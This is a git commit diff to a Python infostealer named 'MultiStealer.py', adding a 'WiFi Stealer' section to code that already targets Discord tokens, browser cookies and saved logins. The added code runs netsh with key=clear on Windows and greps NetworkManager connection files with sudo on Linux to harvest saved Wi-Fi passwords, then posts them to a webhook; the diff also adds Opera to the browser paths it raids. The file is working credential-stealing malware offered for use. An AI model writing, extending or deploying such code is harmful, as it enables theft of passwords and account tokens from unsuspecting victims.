05769a17efbc524e7432e9860358b42f5b8baf57
xemulat <98595166+xemulat@users.noreply.github.com>
2022-04-23 11:18:35 +0200

    Added WiFi Stealer LETS FU$KING GOOOOO

--- MultiStealer.py
+++ MultiStealer.py
@@ -1,5 +1,5 @@
 import os
-if os.name != "nt":
+if os.name != "nt":         #get pc/os name
     exit()
 from re import findall
 from json import loads, dumps
@@ -15,11 +15,13 @@ from sqlite3 import connect
 from Cryptodome.Cipher import AES
 from shutil import copy2
 from requests import post, get
+import getpass
 dt = datetime.now()
 
 
-webhookurl = ""     #computer
-WEBHOOK_URL = ''    #discord
+webhookurl = ""     #browser info webhook
+WEBHOOK_URL = ''    #discord token webhook
+url = ""            #Wifi webhook
 
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -28,9 +30,9 @@ PATHS = {
     "Discord"           : ROAMING + "\\Discord",
     "Discord Canary"    : ROAMING + "\\discordcanary",
     "Discord PTB"       : ROAMING + "\\discordptb",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
     "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
     "Firefox"           : LOCAL + "\\Mozilla\\Firefox\\User Data\\Profiles",
-    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
     "Edge"              : LOCAL + "\\\Microsoft\\Edge\\User Data\\Default",
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
     "Vivaldi"           : LOCAL + "\\Vivaldi\\User Data\\User Data",
@@ -435,7 +437,7 @@ else:
 
 ###WEBHOOK
 
-def post_to(file):
+def post_to(file):      #idk why but when i remove token and chatid the whole program crashes
     token = ""
     chatid = ""
     webhookurl
@@ -460,3 +462,93 @@ if os.path.exists(fileCookies) == True:
 
 os.remove("TempMan.db")
 os.remove("CookMe.db")
+
+#---------Wifi Stealer Begun---------
+
+
+OS = ''
+COMMAND_WINDOWS = "netsh wlan show profile"
+COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
+RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'
+
+
+def identify():
+    global OS
+    OS = sys.platform
+
+def subprocess_args(include_stdout=True):
+    if hasattr(subprocess, 'STARTUPINFO'):
+        
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        
+        env = os.environ
+    else:
+        si = None
+        env = None
+		
+    if include_stdout:
+        ret = {'stdout': subprocess.PIPE}
+    else:
+        ret = {}
+		
+    ret.update({'stdin': subprocess.PIPE,
+                'stderr': subprocess.PIPE,
+                'startupinfo': si,
+                'env': env })
+    return ret
+
+def get_passwords():
+    dataToBeSent = {}
+    dataList = []
+
+    if OS == 'win32':
+
+        output = subprocess.check_output(COMMAND_WINDOWS,**subprocess_args(False)).decode('ascii').split('\n')
+        SSID = list()
+        for name in output:
+            try:
+                Name = name.split(':')[1].strip()  
+                SSID.append(Name)
+            except:
+                pass
+
+        for ssid in SSID:
+            try:
+                Password = subprocess.check_output(COMMAND_WINDOWS + ' name="' + ssid + '" key=clear',**subprocess_args(False)).decode('ascii')
+                PSK = re.findall('Key Content(.*)\n', Password)[0].strip().split(':')[1].strip()
+                temp = {}
+                temp["ssid"] = ssid
+                temp["pass"] = PSK
+                dataList.append(temp)
+            except:
+                pass
+
+    elif OS == "linux" or OS == "linux2" or OS == "linux3":
+        output = subprocess.check_output(COMMAND_LINUX, shell=True).decode('utf-8').split('\n')
+        for pair in output:
+            try:
+                pair = re.findall(RE_LINUX, pair)[0].split(':')
+                ssid = pair[0]
+                psk = pair[1].split('=')[1]
+                temp = {}
+                temp["ssid"] = ssid
+                temp["pass"] = psk
+                dataList.append(temp)
+
+            except:
+                pass
+
+    dataToBeSent["passwords"] = dataList
+    return dataToBeSent
+
+def send():
+    jsonData = get_passwords()
+    #print(jsonData)
+    send = requests.post(url, {
+    'username': 'WIFI Password Stealer',
+    'content': str(jsonData),
+    })
+
+identify()
+send()
